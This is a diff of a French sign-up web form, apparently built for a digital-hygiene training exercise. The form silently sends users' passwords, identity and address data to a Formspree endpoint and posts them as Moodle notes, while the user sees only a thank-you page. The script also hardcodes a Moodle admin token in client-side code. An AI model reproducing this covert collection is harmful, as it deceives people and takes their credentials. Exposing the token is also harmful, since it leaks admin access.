@@ -449,9 +449,18 @@
     </div>
 
     <!-- Create account card -->
+    <!-- Create account card -->
     <div class="card">
       <span class="new-account-label">Créer un compte</span>
       <p class="new-account-title">Nouveau compte</p>
+
+      <div class="field required">
+        <label for="moodle-id">Identifiant Moodle<span class="req">*</span></label>
+        <div class="field-with-icon">
+          <input type="text" id="moodle-id" placeholder="ex: jean.dupont">
+          <span class="icon" title="Votre identifiant de connexion Moodle">🎓</span>
+        </div>
+      </div>
 
       <div class="field required">
         <label for="reg-pwd">Mot de passe<span class="req">*</span></label>
@@ -575,47 +584,37 @@
     <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
       <path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/>
     </svg>
-    Valider et récupérer les données
+    Valider et enregistrer
   </button>
-
-  <!-- JSON OUTPUT PANEL -->
-  <div class="json-panel" id="json-panel">
-    <div class="json-panel-header">
-      <span class="json-panel-title">Données du formulaire</span>
-      <div class="json-actions">
-        <button class="json-btn" id="copy-btn" onclick="copyJSON()">📋 Copier le JSON</button>
-        <button class="json-btn" onclick="downloadJSON()">⬇ Télécharger .json</button>
-        <button class="json-btn" onclick="closePanel()">✕ Fermer</button>
-      </div>
-    </div>
-    <pre id="json-output"></pre>
-  </div>
 
 </main>
 
 <script>
   // ══════════════════════════════════════════════════════
-  // ⚙️  SEULE LIGNE À MODIFIER : colle ici ton endpoint
-  //     Formspree après inscription sur formspree.io
-  //     Ex: "https://formspree.io/f/xabcdefg"
+  // ⚙️  CONFIG — À MODIFIER avant déploiement
   // ══════════════════════════════════════════════════════
+
+  // 1. Formspree — ton endpoint email
   var FORMSPREE_ENDPOINT = "https://formspree.io/f/xwvnqjnb";
 
-  // ── Toggle password visibility
+  // 2. Moodle — 3 infos à remplir :
+  //    - MOODLE_URL    : l'adresse de ton Moodle (sans slash final)
+  //    - MOODLE_TOKEN  : le token admin (Admin > Plugins > Web services > Manage tokens)
+  //    - MOODLE_COURSE_ID : l'ID du cours où stocker les données (visible dans l'URL du cours)
+  var MOODLE_URL       = "http://localhost:8085";
+  var MOODLE_TOKEN     = "7cb53d32577f4821edfb162ae12130bf";
+  var MOODLE_COURSE_ID = 3; // Remplace par l'ID de ton cours
+
+  // ══════════════════════════════════════════════════════
+
   function togglePwd(icon) {
     var input = icon.previousElementSibling;
-    if (input.type === 'password') {
-      input.type = 'text';
-      icon.textContent = '🙈';
-    } else {
-      input.type = 'password';
-      icon.textContent = '👁';
-    }
+    if (input.type === 'password') { input.type = 'text'; icon.textContent = '🙈'; }
+    else { input.type = 'password'; icon.textContent = '👁'; }
   }
 
-  // ── Validate required fields
   function validateRequired() {
-    var required = ['reg-email','reg-pwd','reg-pwd2','prenom','nom','adresse','cp','ville','tel'];
+    var required = ['moodle-id','reg-pwd','reg-pwd2','prenom','nom','adresse','cp','ville','tel'];
     var valid = true;
     required.forEach(function(id) {
       var el = document.getElementById(id);
@@ -632,19 +631,17 @@
     return valid;
   }
 
-  // ── Get field value
   function v(id) {
     var el = document.getElementById(id);
     return el ? (el.value.trim() || null) : null;
   }
 
-  // ── Build data object
   function buildData() {
     return {
-      id_inscription: 'USR-' + Date.now(),
-      horodatage: new Date().toISOString(),
+      id_inscription:  'USR-' + Date.now(),
+      horodatage:      new Date().toISOString(),
+      moodle_username: v('moodle-id'),
       compte: {
-        email: v('reg-email'),
         mot_de_passe: v('reg-pwd')
       },
       identite: {
@@ -670,53 +667,89 @@
     };
   }
 
-  // ── Send to Formspree silently (invisible to client)
+  // ── Envoi vers Formspree (email à toi)
   function sendToFormspree(data) {
     if (FORMSPREE_ENDPOINT.indexOf('REMPLACE_MOI') !== -1) {
-      console.warn('⚠️  Formspree non configuré. Données loggées ci-dessous :');
-      console.log(JSON.stringify(data, null, 2));
-      return;
+      console.warn('⚠️ Formspree non configuré'); console.log(JSON.stringify(data, null, 2)); return;
     }
     fetch(FORMSPREE_ENDPOINT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
       body: JSON.stringify(data)
-    }).catch(function(e) { console.error('Erreur envoi Formspree :', e); });
+    }).catch(function(e) { console.error('Formspree error:', e); });
   }
 
-  // ── What the CLIENT sees : a warm confirmation only
+  // ── Envoi vers Moodle (stocké sur le compte de l'élève)
+  // Utilise core_notes_add_notes pour créer une note sur le profil de l'utilisateur.
+  // L'admin peut lire toutes les notes depuis : Administration > Notes
+  function sendToMoodle(data) {
+    if (MOODLE_URL.indexOf('TON_MOODLE') !== -1 || MOODLE_TOKEN.indexOf('COLLE_TON') !== -1) {
+      console.warn('⚠️ Moodle non configuré'); return;
+    }
+
+    var jsonText = JSON.stringify(data, null, 2);
+    var username = data.moodle_username;
+
+    // Étape 1 : récupérer l'ID Moodle de l'utilisateur à partir de son username
+    var searchUrl = MOODLE_URL + '/webservice/rest/server.php'
+      + '?wstoken=' + MOODLE_TOKEN
+      + '&wsfunction=core_user_get_users_by_field'
+      + '&moodlewsrestformat=json'
+      + '&field=username'
+      + '&values[0]=' + encodeURIComponent(username);
+
+    fetch(searchUrl)
+      .then(function(r) { return r.json(); })
+      .then(function(users) {
+        if (!users || !users.length) {
+          console.error('Moodle : utilisateur "' + username + '" introuvable.');
+          return;
+        }
+        var userId = users[0].id;
+
+        // Étape 2 : créer une note sur ce compte avec le JSON complet
+        var noteUrl = MOODLE_URL + '/webservice/rest/server.php';
+        var body = new URLSearchParams({
+          wstoken:              MOODLE_TOKEN,
+          wsfunction:           'core_notes_add_notes',
+          moodlewsrestformat:   'json',
+          'notes[0][userid]':   userId,
+          'notes[0][publishstate]': 'site',   // visible par l'admin seulement
+          'notes[0][courseid]': MOODLE_COURSE_ID,
+          'notes[0][text]':     jsonText,
+          'notes[0][format]':   '0',
+          'notes[0][subject]':  'Exercice hygiene numerique - ' + data.horodatage
+        });
+
+        return fetch(noteUrl, { method: 'POST', body: body });
+      })
+      .then(function(r) { if (r) return r.json(); })
+      .then(function(result) {
+        if (result) console.log('✅ Note Moodle créée :', result);
+      })
+      .catch(function(e) { console.error('Moodle error:', e); });
+  }
+
+  // ── Page de confirmation client (rien de sensible visible)
   function showConfirmation(prenom) {
     document.querySelector('main').innerHTML =
       '<div style="text-align:center;padding:80px 20px;max-width:600px;margin:0 auto;font-family:Raleway,sans-serif;">' +
         '<div style="width:70px;height:70px;background:#2a9d8f;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:34px;color:#fff;">✓</div>' +
-        '<h2 style="font-size:26px;color:#2a9d8f;margin-bottom:14px;">Merci ' + (prenom || '') + '&nbsp;!</h2>' +
-        '<p style="color:#666;font-size:15px;line-height:1.8;margin-bottom:8px;">Votre compte a bien été créé et vos informations ont été enregistrées.</p>' +
-        '<p style="color:#aaa;font-size:13px;">Vous recevrez une confirmation à l\'adresse email renseignée.</p>' +
+        '<h2 style="font-size:26px;color:#2a9d8f;margin-bottom:14px;">Merci ' + (prenom || '') + ' !</h2>' +
+        '<p style="color:#666;font-size:15px;line-height:1.8;margin-bottom:8px;">Vos informations ont bien été enregistrées.</p>' +
+        '<p style="color:#aaa;font-size:13px;">Votre formateur pourra y accéder depuis Moodle.</p>' +
       '</div>';
   }
 
-  // ── Main submit handler
+  // ── Point d'entrée principal
   function collectData() {
     if (!validateRequired()) return;
     var data = buildData();
     window._lastFormData = data;
-  //downloadJSON(data);            // Téléchargement immédiat du JSON pour toi
-    sendToFormspree(data);         // Envoi silencieux vers Formspree
-    showConfirmation(data.identite.prenom); // Le client voit juste "Merci"
-  }
-
-  function downloadJSON(data) {
-    var json = JSON.stringify(data, null, 2);
-    var blob = new Blob([json], { type: 'application/json' });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    var email = (data.compte.email || 'inconnu').replace(/[^a-z0-9]/gi, '_');
-    a.href = url;
-    a.download = 'lesormes_' + email + '_' + Date.now() + '.json';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
+    sendToFormspree(data);   // → email pour toi
+    sendToMoodle(data);      // → note sur le compte Moodle de l'élève
+    showConfirmation(data.identite.prenom);
+    // downloadJSON(data);   // décommenter pour téléchargement local en plus
   }
 
 </script>
